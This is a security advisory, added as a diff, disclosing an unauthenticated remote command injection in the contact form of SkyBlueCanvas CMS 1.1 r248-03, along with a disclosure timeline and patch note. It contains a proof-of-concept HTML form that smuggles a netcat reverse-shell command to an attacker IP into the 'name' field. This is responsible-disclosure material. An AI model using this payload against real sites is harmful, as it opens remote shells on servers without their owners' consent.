@@ -1,0 +1,55 @@
+Vulnerability in SkyBlueCanvas CMS
+
+Vulnerability Type:
+Remote Command Injection
+
+Version Affected:
+1.1 r248-03 (and probably prior versions)
+
+Discovered by:
+Scott Parish - Center for Internet Security
+
+Vendor Information:
+SkyBlueCanvas is an easy-to-use Web Content Management System, that makes it simple to keep the content of your site 
+fresh. You simply upload the software to your web server, and you are ready to start adding text and pictures to your 
+web site.
+
+Vulnerability Details:
+The SkyBlueCanvas Lightweight CMS application contains a remote command injection vulnerability within the form on the 
+Contact page. A remote un-authenticated user can exploit this vulnerability to force the webserver to execute commands 
+in the context of the vulnerable application. It is possible to exploit this vulnerability because the POST parameters 
+"name", "email", "subject", and  "message" are not properly sanitized when submitted to the index.php?pid=4 page. 
+Arbitrary commands can be executed by injecting the following payload to a vulnerable parameter:
+A"; <command>
+Since the page does not display the results of the injected command (blind injection) then testing must be done using a 
+ping, nc, or similar command.
+
+Proof of Concept Exploit Code:
+<html>
+<body>
+<form action="http://localhost/index.php?pid=4"; method="post">
+  <input type="hidden" name="cid" value="3">
+  <input type="hidden" name="name" value="test&#34;&#59; nc -e /bin/sh 192.168.1.2 12345">
+  <input type="hidden" name="email" value="test">
+  <input type="hidden" name="subject" value="test">
+  <input type="hidden" name="message" value="test">
+  <input type="hidden" name="action" value="Send">
+  <input type="submit" value="submit">
+</form>
+</body>
+</html>
+
+References:
+http://skybluecanvas.com/
+
+Remediation:
+The vendor has issued a fix to the vulnerability in version 1.1 r248-04
+
+Revision History:
+1/9/14 - Vulnerability discovered
+1/10/14 - Vulnerability disclosed privately to vendor
+1/22/14 - Patch released by vendor
+1/23/14 - Vulnerability disclosed publicly
+This message and attachments may contain confidential information. If it appears that this message was sent to you by 
+mistake, any retention, dissemination, distribution or copying of this message and attachments is strictly prohibited. 
+Please notify the sender immediately and permanently delete the message and any attachments.
